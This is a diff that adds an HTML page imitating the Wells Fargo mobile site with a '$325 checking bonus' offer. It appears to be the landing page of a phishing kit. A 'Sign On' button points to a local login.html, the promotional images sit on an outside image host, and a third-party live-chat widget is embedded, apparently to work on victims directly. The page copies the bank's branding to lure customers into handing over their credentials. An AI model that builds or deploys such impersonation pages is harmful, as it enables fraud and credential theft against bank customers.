@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - $325 Bonus</title>
+    <style>
+        /* --- CSS Reset & Variables --- */
+        :root {
+            --wf-red: #d71e28;
+            --wf-gold: #fec33c;
+            --wf-purple: #a02070;
+            --wf-beige: #f3f0ed;
+            --wf-black: #1f1f1f;
+            --wf-white: #ffffff;
+            --wf-gray-line: #cccccc;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: var(--wf-white);
+            color: var(--wf-black);
+            -webkit-font-smoothing: antialiased;
+            padding-bottom: 50px; /* Extra space at bottom */
+        }
+
+        /* --- Header Section --- */
+        .header {
+            background-color: var(--wf-red);
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 6px solid var(--wf-gold);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .logo {
+            color: var(--wf-white);
+            font-family: 'Times New Roman', Times, serif;
+            font-size: 1.4rem;
+            font-weight: bold;
+            text-decoration: none;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        /* UPDATED: Styles to support Anchor tag as button */
+        .sign-on-btn {
+            background-color: var(--wf-white);
+            color: #333;
+            border: none;
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9rem;
+            cursor: pointer;
+            white-space: nowrap;
+            font-family: inherit;
+            text-decoration: none; /* Removes underline for link */
+            display: inline-block; /* Ensures proper sizing */
+        }
+
+        .menu-btn {
+            background: none;
+            border: none;
+            color: var(--wf-white);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            gap: 3px;
+        }
+
+        .menu-icon-bar {
+            width: 26px;
+            height: 2px;
+            background-color: var(--wf-white);
+            display: block;
+        }
+
+        .menu-text {
+            font-size: 0.65rem;
+            font-weight: normal;
+            margin-top: 1px;
+            font-family: inherit;
+        }
+
+        /* --- Hero Section (Beige Box) --- */
+        .hero {
+            background-color: var(--wf-beige);
+            padding: 3.5rem 1rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+
+        .offer-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .purple-bar {
+            height: 5px;
+            width: 80px;
+            background-color: var(--wf-purple);
+            margin: 5px 0;
+        }
+
+        .offer-text-enjoy {
+            color: var(--wf-purple);
+            font-size: 1.1rem;
+            margin-top: 8px;
+            font-weight: 400;
+        }
+
+        .offer-amount {
+            color: var(--wf-purple);
+            font-size: 4.5rem;
+            line-height: 1;
+            font-weight: 400;
+            margin-bottom: 15px;
+            margin-top: -5px;
+        }
+
+        /* --- Main Content --- */
+        .content {
+            padding: 2.5rem 1.5rem;
+            text-align: center;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .headline {
+            font-size: 2rem;
+            font-weight: 400;
+            margin-bottom: 1.5rem;
+            line-height: 1.2;
+            color: #111;
+        }
+
+        .sub-text {
+            font-size: 1.15rem;
+            line-height: 1.5;
+            margin-bottom: 2.5rem;
+            color: #000;
+        }
+
+        .cta-button {
+            display: block;
+            width: 100%;
+            padding: 14px;
+            background-color: transparent;
+            border: 1px solid var(--wf-black);
+            border-radius: 50px;
+            color: var(--wf-black);
+            font-size: 1.1rem;
+            font-weight: bold;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+
+        .cta-button:hover {
+            background-color: #f4f4f4;
+        }
+
+        .divider-line {
+            border: 0;
+            height: 1px;
+            background-color: #e0e0e0;
+            margin: 2rem 0 0 0; 
+        }
+
+        /* --- Full Width Image Section --- */
+        .promo-image-section {
+            padding: 0;
+            width: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .promo-img {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 0;
+            vertical-align: middle; 
+        }
+
+        /* --- Mobile Menu Overlay --- */
+        .mobile-menu-overlay {
+            display: none;
+            position: fixed;
+            top: 76px;
+            left: 0;
+            width: 100%;
+            height: calc(100% - 76px);
+            background: white;
+            z-index: 99;
+            padding: 20px;
+        }
+
+        .mobile-menu-overlay.active {
+            display: block;
+        }
+
+        /* --- Responsive Tweaks --- */
+        @media (min-width: 768px) {
+            .hero { padding: 5rem 1rem; }
+            .cta-button { width: auto; padding-left: 3rem; padding-right: 3rem; display: inline-block; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="#" class="logo">WELLS FARGO</a>
+        <div class="nav-right">
+            <a href="login.html" class="sign-on-btn">Sign On</a>
+            <button class="menu-btn" id="menuToggle">
+                <span class="menu-icon-bar"></span>
+                <span class="menu-icon-bar"></span>
+                <span class="menu-icon-bar"></span>
+                <span class="menu-text">MENU</span>
+            </button>
+        </div>
+    </header>
+
+    <div class="mobile-menu-overlay" id="mobileMenu">
+        <p>Menu options would appear here.</p>
+    </div>
+
+    <section class="hero">
+        <div class="offer-container">
+            <div class="purple-bar"></div>
+            <p class="offer-text-enjoy">Enjoy</p>
+            <h2 class="offer-amount">$325</h2>
+            <div class="purple-bar"></div>
+        </div>
+    </section>
+
+    <main class="content">
+        <h1 class="headline">$325 checking bonus on us</h1>
+        <p class="sub-text">New customers open an eligible checking account with qualifying direct deposits</p>
+        
+        <a href="#" class="cta-button">Get started >></a>
+    </main>
+
+    <hr class="divider-line">
+
+    <section class="promo-image-section">
+        <img src="https://i.ibb.co/vxghR4Cz/IMG-4118.jpg" alt="Promotional Offer Part 1" class="promo-img">
+        <img src="https://i.ibb.co/nsp1gB4K/IMG-4120.jpg" alt="Promotional Offer Part 2" class="promo-img">
+        <img src="https://i.ibb.co/20BD2rBC/IMG-4121.jpg" alt="Promotional Offer Part 3" class="promo-img">
+        <img src="https://i.ibb.co/JwRz8Zp0/IMG-4123.jpg" alt="Promotional Offer Part 4" class="promo-img">
+        <img src="https://i.ibb.co/PZqLpbsK/IMG-4124.jpg" alt="Promotional Offer Part 5" class="promo-img">
+        <img src="https://i.ibb.co/1YQzyKx6/IMG-4125.jpg" alt="Promotional Offer Part 6" class="promo-img">
+        <img src="https://i.ibb.co/7PGZMHV/IMG-4126.jpg" alt="Promotional Offer Part 7" class="promo-img">
+        <img src="https://i.ibb.co/TdR0bRV/IMG-4127.jpg" alt="Promotional Offer Part 8" class="promo-img">
+        <img src="https://i.ibb.co/N2cRttkZ/IMG-4128.jpg" alt="Promotional Offer Part 9" class="promo-img">
+        <img src="https://i.ibb.co/CpCB12fZ/IMG-4129.jpg" alt="Promotional Offer Part 10" class="promo-img">
+        <img src="https://i.ibb.co/YB5YNzLb/IMG-4130.jpg" alt="Promotional Offer Part 11" class="promo-img">
+        <img src="https://i.ibb.co/4ZrhCTNH/IMG-4132.jpg" alt="Promotional Offer Part 12" class="promo-img">
+    </section>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const menuBtn = document.getElementById('menuToggle');
+            const mobileMenu = document.getElementById('mobileMenu');
+
+            menuBtn.addEventListener('click', () => {
+                mobileMenu.classList.toggle('active');
+            });
+        });
+    </script>
+   <!-- Begin of Chaport Live Chat code -->
+<script type="text/javascript">
+(function(w,d,v3){
+w.chaportConfig = {
+appId : '69b5211e08947cb90398c080',
+};
+
+if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document);
+</script>
+<!-- End of Chaport Live Chat code -->
+
+</body>
+</html>
